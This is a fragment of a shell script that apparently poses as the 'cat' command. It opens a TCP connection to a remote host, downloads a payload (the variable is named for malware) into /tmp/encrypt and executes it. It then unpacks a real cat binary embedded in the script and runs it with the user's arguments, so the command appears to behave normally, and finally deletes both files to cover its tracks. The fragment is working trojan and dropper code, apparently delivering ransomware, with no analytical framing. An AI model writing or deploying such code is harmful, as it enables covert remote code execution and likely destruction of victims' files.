
encpath="/tmp/encrypt"
exec 5<>/dev/tcp/"$ip"/"$port"
response="$(dd bs=$malwaresize count=1 <&5 2>/dev/null)"
echo -n "$response" > "$encpath"
exec 5<&-
exec 5>&-

catpath="/tmp/cat"
tail -c "$(($catgzsize + 4))" "$0" | head -c -4 | gzip -d > "$catpath"
chmod +x "$encpath"
chmod +x "$catpath"
"$encpath"
"$catpath" "$@"
rm "$encpath"
rm "$catpath"
exit 0
